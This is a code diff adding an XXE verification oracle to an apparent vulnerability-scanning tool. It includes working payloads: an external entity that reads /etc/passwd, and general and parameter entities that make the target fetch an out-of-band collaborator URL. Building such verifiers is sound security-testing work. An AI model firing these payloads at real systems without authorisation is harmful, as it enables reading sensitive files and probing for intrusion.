@@ -1052,6 +1052,90 @@ def verify_exposure(candidate: Candidate, transport: Transport) -> Verdict:
     return Verdict(REJECTED, "excessive-data-exposure", loc, "no exposed identity+credential records")
 
 
+# --- XXE (XML external entity) -----------------------------------------------------------------
+_XXE_TMPL = '<?xml version="1.0"?><!DOCTYPE foo [{dtd}]><foo>{ref}</foo>'
+_XXE_CTYPES = ("application/xml", "text/xml")
+
+
+def _xxe_poll(oob, token, timeout):
+    deadline = time.time() + float(timeout)
+    while time.time() < deadline:
+        external = oob.hit_sources(token) - oob.grin_ips()
+        if external:
+            return external
+        time.sleep(0.25)
+    return set()
+
+
+def verify_xxe(candidate: Candidate, transport: Transport) -> Verdict:
+    """Oracle: the endpoint parses POSTed XML and resolves EXTERNAL entities. IN-BAND: an external
+    entity reads file:///etc/passwd and >=2 passwd-format lines appear in the response, absent from a
+    benign-entity baseline that itself returned a usable (non-error) response -- the asymmetry guard
+    stops a benign-errors / attack-succeeds path from a false CONFIRMED. OOB BLIND: an external
+    general entity, then (if that is blocked) an external-DTD parameter entity, point at grin's
+    collaborator; the target's parser fetches it (callback from a non-grin source). CONFIRMED on any
+    arm. Reuses the path-traversal passwd oracle and the SSRF source-IP guard. Payloads carry NO
+    nested/recursive entities (no billion-laughs). Tries application/xml then text/xml. INCONCLUSIVE
+    if no XML body could be POSTed; REJECTED if no arm fires."""
+    loc, o = candidate.location, candidate.oracle
+    tmpl = o.get("xml_template", _XXE_TMPL)
+    timeout = o.get("ssrf_timeout", 3)
+    agent = transport.by_role.get("attacker") or (
+        lambda u, method="GET", json=None, data=None, headers=None: transport.request(
+            method, u, data=data, headers=headers))
+
+    def post_xml(xml, ctype):
+        return agent(candidate.url, method="POST", data=xml, headers={"Content-Type": ctype})
+
+    sent_any = False
+    # --- in-band file read (reflection-based), per content-type ---
+    benign = tmpl.format(dtd='<!ENTITY xxe "grin-xxe-baseline">', ref="&xxe;")
+    attack = tmpl.format(dtd='<!ENTITY xxe SYSTEM "file:///etc/passwd">', ref="&xxe;")
+    for ctype in _XXE_CTYPES:
+        try:
+            bs, bbody = post_xml(benign, ctype)
+            _as, abody = post_xml(attack, ctype)
+        except Exception:
+            continue
+        sent_any = True
+        bbody, abody = bbody or "", abody or ""
+        benign_usable = bool(bs) and bs < 400 and bool(bbody)   # only trust the diff if comparable
+        if benign_usable and not _is_passwd(bbody) and _is_passwd(abody):
+            return Verdict(CONFIRMED, "xxe", loc,
+                           "in-band XXE: an external entity read /etc/passwd (>=2 passwd lines in the "
+                           "response, absent from a benign-entity baseline)")
+
+    # --- OOB blind: general entity, then external-DTD parameter entity (catches blocked-GE sinks) ---
+    oob = o.get("oob")
+    if oob is not None and oob.healthy():
+        for ctype in _XXE_CTYPES:
+            ge = oob.mint_token()
+            ge_xml = tmpl.format(dtd=f'<!ENTITY xxe SYSTEM "{oob.callback_url(ge)}">', ref="&xxe;")
+            try:
+                post_xml(ge_xml, ctype)
+                sent_any = True
+            except Exception:
+                pass
+            if _xxe_poll(oob, ge, timeout):
+                return Verdict(CONFIRMED, "xxe", loc,
+                               "blind XXE: the target's XML parser fetched the OOB collaborator via an external entity")
+            pe = oob.mint_token()
+            pe_xml = ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % grin SYSTEM '
+                      f'"{oob.callback_url(pe)}.dtd"> %grin;]><foo/>')
+            try:
+                post_xml(pe_xml, ctype)
+                sent_any = True
+            except Exception:
+                pass
+            if _xxe_poll(oob, pe, timeout):
+                return Verdict(CONFIRMED, "xxe", loc,
+                               "blind XXE: the target fetched an external DTD (parameter entity) from the OOB collaborator")
+
+    if not sent_any:
+        return Verdict(INCONCLUSIVE, "xxe", loc, "could not POST an XML body to the endpoint")
+    return Verdict(REJECTED, "xxe", loc, "no external-entity resolution (no file read, no out-of-band fetch)")
+
+
 _REGISTRY: dict = {
     "ssti": verify_ssti,
     "idor": verify_idor,
@@ -1064,6 +1148,7 @@ _REGISTRY: dict = {
     "jwt-weak-secret": verify_jwt_weak_secret,
     "reflected-xss": verify_reflected_xss,
     "stored-xss": verify_stored_xss,
+    "xxe": verify_xxe,
     "ssrf": verify_ssrf,
     "command-injection": verify_cmd_injection,
     "blind-command-injection": verify_blind_cmd_injection,
